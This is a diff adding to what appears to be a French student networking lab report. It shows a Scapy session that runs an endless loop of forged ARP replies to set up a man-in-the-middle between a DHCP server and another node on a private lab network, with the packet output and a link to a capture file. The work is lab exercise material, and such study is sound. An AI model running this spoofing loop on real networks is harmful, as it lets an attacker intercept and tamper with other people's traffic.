@@ -493,3 +493,53 @@ Finished sending 1 packets.
 
 🌞 Mettre en place un MITM ARP
 
+```bash
+[toto@node1 ~]$ sudo python
+[sudo] password for toto:
+Python 3.9.21 (main, Dec  5 2024, 00:00:00)
+[GCC 11.5.0 20240719 (Red Hat 11.5.0-2)] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from scapy.all import *
+_ip = "10.1.1.100"
+node2_ip = "10.1.1.12"
+
+node2_mac = "08:00:27:93:02:66"
+dhcp_mac = "08:00:27:e0:92:42"
+
+while True:
+    ans, unans = sr(ARP(op=2, pdst=dhcp_ip, psrc=node2_ip, hwdst=dhcp_mac))
+    ans, unans = sr(ARP(op=2, pdst=node2_ip, psrc=dhcp_ip, hwdst=node2_mac))>>>
+>>> dhcp_ip = "10.1.1.253"
+>>> node1_ip = "10.1.1.100"
+>>> node2_ip = "10.1.1.12"
+>>>
+>>> node2_mac = "08:00:27:93:02:66"
+>>> dhcp_mac = "08:00:27:e0:92:42"
+>>>
+>>> while True:
+...     ans, unans = sr(ARP(op=2, pdst=dhcp_ip, psrc=node2_ip, hwdst=dhcp_mac))
+...     ans, unans = sr(ARP(op=2, pdst=node2_ip, psrc=dhcp_ip, hwdst=node2_mac))
+...
+Begin emission:
+Finished sending 1 packets.
+..........................................................................................................................
+....
+.............^C
+Received 139 packets, got 0 answers, remaining 1 packets
+Begin emission:
+Finished sending 1 packets.
+........^C
+Received 8 packets, got 0 answers, remaining 1 packets
+Begin emission:
+Finished sending 1 packets.
+.............................................................................................................................................................^C
+Received 2030 packets, got 0 answers, remaining 1 packets
+Begin emission:
+Finished sending 1 packets.
+```
+
+🦈 Capture MITM ARP
+
+[arp_mitm_1.pcap](/arp_mitm_1.pcap)
+
+# Part V : Play with DHCP
